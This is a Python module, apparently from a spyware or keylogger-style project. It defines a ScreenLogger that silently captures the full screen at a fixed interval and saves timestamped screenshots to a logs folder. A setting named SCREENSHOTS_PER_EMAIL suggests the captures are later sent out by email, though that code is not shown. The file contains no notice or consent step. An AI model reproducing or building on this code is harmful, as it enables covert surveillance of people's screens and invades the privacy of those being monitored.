import PIL.ImageGrab
import time
import os

from config.config import LOGS_DIRECTORY, SCREENSHOT_INTERVAL, SCREENSHOTS_PER_EMAIL
from core.utils.logging_utils import timestamp, log_error


class ScreenLogger:
    def __init__(self):
        self.logs_directory = os.path.join(LOGS_DIRECTORY, "screenshots/")
        self.interval = SCREENSHOT_INTERVAL
        self.running = True

    def log_screen(self):
        screenshot = PIL.ImageGrab.grab()
        screenshot.save(os.path.join(self.logs_directory, f"{timestamp()}.png"))
        screenshot.close()

    def run(self):
        try:
            while self.running:
                self.log_screen()
                time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
